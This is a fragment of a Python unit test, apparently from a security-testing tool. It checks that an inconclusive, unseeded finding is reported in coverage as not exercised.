        spec_id=spec.id,
        target_id="app",
        status=VerdictStatus.INCONCLUSIVE,
        risk=risk,
        confirmed=False,
        attempts=[attempt],
        evidence=[],
        reasoning="setup_not_seeded: ...; the resumed run had sent 1 of 2 attempts",
    )
    coverage = _build_coverage([finding], {spec.id: spec})
    assert spec.id in coverage.not_exercised
